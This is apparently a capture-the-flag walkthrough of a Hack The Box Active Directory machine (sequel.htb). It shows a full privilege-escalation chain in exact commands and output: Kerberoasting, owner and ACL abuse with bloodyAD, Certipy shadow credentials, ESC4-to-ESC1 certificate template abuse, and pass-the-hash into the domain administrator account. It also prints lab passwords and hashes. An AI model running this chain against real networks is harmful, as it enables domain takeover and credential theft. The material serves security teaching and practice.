The command 'bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d 'sequel.htb' -c All -ns 10.129.32.26 -v --zip' uses the BloodHound Python ingestor to collect Active Directory reconnaissance data from the domain. Authenticating with the compromised 'ryan' user credentials, it enumerates all available data collection methods and connects to the domain controller at 10.129.32.26. The tool successfully gathers domain information and compresses the output into a ZIP file named 20251109131052_bloodhound.zip for later analysis in the BloodHound graphical interface to identify attack paths.

```bash
bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d 'sequel.htb' -c All -ns  10.129.32.26  -v --zip

Compressing output into 20251109131052_bloodhound.zip
```

The BloodHound analysis reveals a critical attack path. The user RYAN@SEQUEL.HTB has the WriteOwner permission over the user object CA_SVC@SEQUEL.HTB. This privilege allows Ryan to change the owner of the CA_SVC user object to himself, after which he could modify the account's properties, including resetting its password. This constitutes a privilege escalation vector where the compromised Ryan account can take control of the CA_SVC account.

![BloodHound Analysis](images/Escape2(1).png)

The BloodHound analysis identifies that the user RYAN@SEQUEL.HTB has the ForceChangePassword permission over the user object CA_SVC@SEQUEL.HTB. This privilege allows Ryan to change the CA_SVC account's password without knowing the current one. This is a more direct privilege escalation vector than WriteOwner, as it immediately grants control over the CA_SVC account by setting a new password of the attacker's choice.

![BloodHound Analysis](images/Escape2(2).png)

The command 'uv add --script targetedKerberoast.py -r requirements.txt' uses the uv package manager to install the targetedKerberoast.py script and its dependencies. This tool is designed to perform a targeted Kerberoasting attack, which requests Kerberos service tickets for specific user accounts that have Service Principal Names (SPNs) set. The script has been successfully updated and is now ready for execution to attempt to retrieve crackable hashes for privileged accounts.

```bash
 uv add --script targetedKerberoast.py  -r requirements.txt
Updated `targetedKerberoast.py`
```

The command 'uv run targetedKerberoast.py -v -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.32.26' executes the targeted Kerberoasting attack script. Using the compromised credentials for the user 'ryan', the script connects to the Domain Controller at 10.129.32.26 and searches for user accounts with Service Principal Names (SPNs) in the 'sequel.htb' domain. For any discovered SPN accounts, the script requests Kerberos service tickets and extracts their encrypted portions, which are hashes that can be taken offline for cracking attempts to recover the plaintext passwords of these privileged service accounts.

```bash
uv run targetedKerberoast.py -v -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.32.26

```

The targeted Kerberoasting attack was successful. The tool retrieved a Kerberos TGS service ticket for the user ca_svc in the SEQUEL.HTB domain. The output shows the complete hash in the format `$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$[hash]`, which is a crackable Kerberos 5 TGS-REP etype 23 hash. This hash can now be taken offline for cracking attempts to recover the plaintext password of the ca_svc service account, which likely has elevated privileges within the domain.

```output
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$b755a7d4ec7385b3ff9355823cdcdf46$7d0c852b73aab7d7a7be8c3d5e9a8fea2f8dc01a6496dccb362ca157818778ad1affc749e1f21cecc01bedf8acb5fd57adcceeffaeba98fb7be018533f9098826463b6e31e9b7a0eb35d57c0702db238996eb841836cb051abca9b1b1fe976b35bfff0ac173995d7a76f32bd5ce9b68a0d6fa6ec962351817f71d1dc058c8f5e6f971951fa175931c0cedca86dec61f7e21264692943e1ec852a38c7614e302d886503075a9ce5fecae37e35f13528ad3ed6a2e403a898b49170f521a83e89aef2bc421aa0c36c0daea7adc2694ffa1201df104b5a5eef5b7fd46e7a369d6852496011b2d4dc248099813a9bf3c600587a3eb6b7127c2098cca943db03117a2b057c99c209e819b650044cd5f0776ca906861db3b0a5ec0392b73796f88652607c2789bfce576e3fd73af900ead72ae49535cdcbc6ad16b1995daf7629b8a9e7d2ad655e5abf25f700b883636348bbad4b231e80685febb0aa136f07a28378fb2827e7c4a04cb9b33dce9cbffc7f41b01787eefca80b9aeced1bde49386c1ac60b033b43d00f00c9692f1ea87b831a7981d858a9342c7716aea086bc8991483fe347a2ac0b99cf01a203059c1f75e82ab4b8578aacab9b948478e0d288ca6205d9e222da8dda6516c447fad5083eb88b4f9d510459e3dbf745617b3f3c51f6fe3c47799069f4d12ad7d9de6886c93e54d21830e7d83a234246b091ec8b2c1bb0a127702ff1dc736f95c2915448b4f4005bdb3f10dc201c26d0c94e058dc6496f9c555520d8986faa67f7b243c99ca362b946ddac89b29d68548e1f4240095b29066784aae2c19b210836fa6d14aa8f9ea67cf1eb5d4b3964caba07f54580539528bbcc6d4291b9a4a6f5bfa70f45a6f07247878b4b665fe5f13f0f2d370f6953dac28b1ae2c987c83074142ceb16c382da96650fae7c254b05f4959c02f13db98b04c7cceea03226bb90e3aafa00f17b95b209ca82b843e975be164b5ff4816a1df0626c8aad093747123d001ad62f7e6eefd23e7bf612d07a5c575bb1b11c9880be1ebf6f7e7790d5c1322b683bb16068f56041e58887b7e29921e64c421a80943b56b5b1991ed6e467347193866c96946c19ed05b15530f5719b9a98daf59ef519288ba4cea7866126a94beba624edd49f62630c2f758cf458204a0c7d01f55a9751433bee9a5cac08537db7c1bd704e1bc554f6e58e98846057cdeb46ff4071f897f5f78d01ad4ac4cef6fde7e52a060d7503fc72c8c365bd748fbbbc15e1a58ab37d0794bdf32489c286d87b2f4ff6ac43094829e493d40b29e2e26e8d7930cf56e51d11b0a2e0a8cdf8d7a89c69a4ce58c416daf8ee9bc4b4b80bfcbb7513f289927ee9f8cdce04e3d03808f5c8ebb0ad2e0859994302b02511333613d372f84bc97ac983404cd6eb4192620f7eefa2063045e9a11c7702759c3838bc

```

The command echoes the complete Kerberos TGS hash for the ca_svc account and writes it to a file named hash.txt using sudo tee. This saves the crackable hash to disk for offline password cracking attempts. The hash is in the format `$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$[hash]` which represents a Kerberos 5 TGS-REP etype 23 hash that can be processed by tools like Hashcat or John the Ripper to recover the plaintext password of the ca_svc service account.

```bash
echo '$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$b755a7d4ec7385b3ff9355823cdcdf46$7d0c852b73aab7d7a7be8c3d5e9a8fea2f8dc01a6496dccb362ca157818778ad1affc749e1f21cecc01bedf8acb5fd57adcceeffaeba98fb7be018533f9098826463b6e31e9b7a0eb35d57c0702db238996eb841836cb051abca9b1b1fe976b35bfff0ac173995d7a76f32bd5ce9b68a0d6fa6ec962351817f71d1dc058c8f5e6f971951fa175931c0cedca86dec61f7e21264692943e1ec852a38c7614e302d886503075a9ce5fecae37e35f13528ad3ed6a2e403a898b49170f521a83e89aef2bc421aa0c36c0daea7adc2694ffa1201df104b5a5eef5b7fd46e7a369d6852496011b2d4dc248099813a9bf3c600587a3eb6b7127c2098cca943db03117a2b057c99c209e819b650044cd5f0776ca906861db3b0a5ec0392b73796f88652607c2789bfce576e3fd73af900ead72ae49535cdcbc6ad16b1995daf7629b8a9e7d2ad655e5abf25f700b883636348bbad4b231e80685febb0aa136f07a28378fb2827e7c4a04cb9b33dce9cbffc7f41b01787eefca80b9aeced1bde49386c1ac60b033b43d00f00c9692f1ea87b831a7981d858a9342c7716aea086bc8991483fe347a2ac0b99cf01a203059c1f75e82ab4b8578aacab9b948478e0d288ca6205d9e222da8dda6516c447fad5083eb88b4f9d510459e3dbf745617b3f3c51f6fe3c47799069f4d12ad7d9de6886c93e54d21830e7d83a234246b091ec8b2c1bb0a127702ff1dc736f95c2915448b4f4005bdb3f10dc201c26d0c94e058dc6496f9c555520d8986faa67f7b243c99ca362b946ddac89b29d68548e1f4240095b29066784aae2c19b210836fa6d14aa8f9ea67cf1eb5d4b3964caba07f54580539528bbcc6d4291b9a4a6f5bfa70f45a6f07247878b4b665fe5f13f0f2d370f6953dac28b1ae2c987c83074142ceb16c382da96650fae7c254b05f4959c02f13db98b04c7cceea03226bb90e3aafa00f17b95b209ca82b843e975be164b5ff4816a1df0626c8aad093747123d001ad62f7e6eefd23e7bf612d07a5c575bb1b11c9880be1ebf6f7e7790d5c1322b683bb16068f56041e58887b7e29921e64c421a80943b56b5b1991ed6e467347193866c96946c19ed05b15530f5719b9a98daf59ef519288ba4cea7866126a94beba624edd49f62630c2f758cf458204a0c7d01f55a9751433bee9a5cac08537db7c1bd704e1bc554f6e58e98846057cdeb46ff4071f897f5f78d01ad4ac4cef6fde7e52a060d7503fc72c8c365bd748fbbbc15e1a58ab37d0794bdf32489c286d87b2f4ff6ac43094829e493d40b29e2e26e8d7930cf56e51d11b0a2e0a8cdf8d7a89c69a4ce58c416daf8ee9bc4b4b80bfcbb7513f289927ee9f8cdce04e3d03808f5c8ebb0ad2e0859994302b02511333613d372f84bc97ac983404cd6eb4192620f7eefa2063045e9a11c7702759c3838bc' | sudo tee  hash.txt > /dev/null

```

The command 'john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' executes John the Ripper to crack the Kerberos TGS hash. The tool loads the hash in the krb5tgs format and begins a dictionary attack using the rockyou.txt wordlist. After running for one minute and fifteen seconds, the session completes without successfully recovering the password, indicating that the ca_svc account's password is not present in the rockyou.txt wordlist. The cracking attempt was unsuccessful with this specific dictionary.

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:15 DONE (2025-11-09 13:41) 0g/s 189356p/s 189356c/s 189356C/s  0841079575..*7¡Vamos!
Session completed. 
```

The command 'uv venv' creates a new Python virtual environment, and 'source .venv/bin/activate' activates this environment. This isolates the Python dependencies and tools for the current penetration testing session, ensuring that any subsequent Python-based attacks or tools run in a controlled environment without conflicts from system-wide packages.

```bash
 uv venv
 source .venv/bin/activate
```

The command 'uv pip install certipy-ad' uses the uv package manager to install the Certipy-AD tool within the activated virtual environment. Certipy-AD is a Python-based tool used for attacking and enumerating Active Directory Certificate Services (AD CS). This installation prepares the environment for conducting AD CS-related attacks, which can be used to escalate privileges or compromise domain credentials through certificate template vulnerabilities.

```bash
uv pip install certipy-ad

```

The command 'uv run certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.32.26' attempts to perform a Shadow Credentials attack against the ca_svc user account. The attack generates a certificate and key credential but fails when trying to add the key credential to the target account. The error "INSUFF_ACCESS_RIGHTS" indicates that the user 'ryan' does not have the necessary permissions to modify the Key Credentials attribute of the 'ca_svc' user object, despite having the ForceChangePassword privilege identified earlier in the BloodHound analysis.

```bash
 uv run certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.32.26  

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a681641ef5dc4ff8a557b036014bf2f6'
[*] Adding Key Credential with device ID 'a681641ef5dc4ff8a557b036014bf2f6' to the Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

The command 'bloodyAD -d sequel.htb --host 10.129.32.26 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan' uses the bloodyAD tool to change the owner of the ca_svc user object. The operation is successful, replacing the previous owner with the user 'ryan'. This leverages the WriteOwner privilege identified in the BloodHound analysis, granting Ryan full ownership rights over the ca_svc account, which can now be used to modify the account's attributes including resetting the password.

```bash
bloodyAD -d sequel.htb --host 10.129.32.26 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan

 Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```

The command 'bloodyAD -d sequel.htb --host 10.129.32.26 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan' uses the bloodyAD tool to grant the GenericAll permission on the ca_svc user object to ryan. The operation is successful, confirming that ryan now has full control over the ca_svc account. This includes all possible permissions, allowing ryan to modify any attribute of the ca_svc user object, including resetting the password, without needing to use the more specific ForceChangePassword right.

```bash
bloodyAD -d sequel.htb --host 10.129.32.26 -u ryan -p WqSZAF6CysDQbGb3 add genericAll  ca_svc ryan
 
ryan has now GenericAll on ca_svc
                                      
```

The command 'uv run certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.32.26' successfully executes a Shadow Credentials attack against the ca_svc user account. After obtaining ownership and GenericAll privileges, the attack adds a new Key Credential to the ca_svc account, authenticates using the generated certificate, retrieves a TGT, and ultimately extracts the NT hash for the ca_svc account: '3b181b914e7a9d5508ea1e20bc2b7fce'. The tool then automatically restores the original Key Credentials to avoid detection. This compromise provides the attacker with the password hash of the privileged ca_svc service account.

```bash
uv run certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.32.26  

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '86608730cf7d4093866b26e6d379e858'
[*] Adding Key Credential with device ID '86608730cf7d4093866b26e6d379e858' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '86608730cf7d4093866b26e6d379e858' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce


```

The command 'nxc smb 10.129.32.26 -u 'ca_svc' -H 3b181b914e7a9d5508ea1e20bc2b7fce' successfully authenticates to the SMB service on the Domain Controller using the compromised NT hash for the ca_svc account. The authentication is successful, confirming that the extracted hash is valid and provides access to the ca_svc user's resources and privileges on the domain. This demonstrates pass-the-hash capability with the compromised service account.

```bash
nxc smb  10.129.32.26 -u 'ca_svc' -H 3b181b914e7a9d5508ea1e20bc2b7fce        

SMB         10.129.32.26    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.32.26    445    DC01             [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce

```

The command 'certipy find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -stdout' uses Certipy to enumerate Active Directory Certificate Services for vulnerable certificate templates. Authenticating with the ca_svc account's NT hash, the tool queries the Domain Controller to identify certificate templates that contain misconfigurations allowing for privilege escalation, such as templates that enable enrollment without proper authorization or templates that allow for domain privilege escalation through certificate abuse.

```bash
certipy find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -stdout 

```

The Certipy enumeration reveals a critical finding. The certificate template 'DunderMifflinAuthentication' is vulnerable to ESC4 abuse. The ca_svc account, which is a member of the SEQUEL.HTB\Cert Publishers group, has both enrollment rights and dangerous permissions (Write Property Enroll) on this template. This allows the ca_svc user to modify the template's configuration and enroll for certificates that can be used for authentication. The template has an extremely long validity period of 1000 years and enables client authentication, making it ideal for persistent domain access.

```bash
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-11-09T14:47:28+00:00
    Template Last Modified              : 2025-11-09T14:47:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

```

The command 'certipy-ad template -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -template DunderMifflinAuthentication -write-default-configuration' successfully modifies the DunderMifflinAuthentication certificate template. Using the ESC4 vulnerability, the tool updates the template's configuration to remove security restrictions, effectively making it vulnerable to abuse. The changes include modifying the security descriptor, flags, key specifications, and enrollment settings to allow for easier certificate enrollment and authentication abuse. This prepares the template for exploitation to obtain a certificate that can be used for domain privilege escalation

```bash
certipy-ad template -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -template DunderMifflinAuthentication -write-default-configuration

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'DunderMifflinAuthentication.json'
[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'


```

The command 'certipy-ad find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -stdout' now identifies two vulnerabilities in the modified DunderMifflinAuthentication certificate template. The template is now vulnerable to ESC1, which allows the enrollee to supply an arbitrary subject in the certificate request and enables client authentication, and ESC4, where the user has dangerous permissions to modify the template. These vulnerabilities enable the ca_svc user to request a certificate for any domain user, including highly privileged accounts like Domain Administrators

```bash
certipy-ad find -vulnerable -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -stdout    


[!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
                          

```

The command 'certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb' successfully exploits the ESC1 vulnerability in the modified certificate template. The tool requests a certificate from the Certificate Authority for the Domain Administrator account using the User Principal Name administrator@sequel.htb. The certificate and private key are successfully saved to 'administrator.pfx', effectively granting the attacker a certificate that can be used to authenticate as the Domain Administrator.

```bash
 certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.32.26 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
 
 
 *] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                    
```

The command 'certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.32.26' successfully uses the obtained certificate to authenticate to the Domain Controller as the Administrator account. The tool retrieves a Ticket Granting Ticket and then extracts the NT hash for the Administrator account: 'aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff'. This confirms complete domain compromise, as the attacker now possesses the Domain Administrator's credentials, providing full control over the Active Directory domain.

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.32.26


[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
                                                    
```

The command 'evil-winrm -i 10.129.32.26 -u 'Administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff' establishes a remote PowerShell session to the Domain Controller using the compromised Domain Administrator NT hash. The connection is successful, providing full administrative access to the host. The attacker navigates to the Administrator's desktop and retrieves the root.txt flag, which contains '23d8980205b62f088986abc8ef91b591', confirming complete compromise of the domain and successful privilege escalation to the highest level of access.

```bash
evil-winrm -i 10.129.32.26 -u 'Administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff

*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
23d8980205b62f088986abc8ef91b591


```

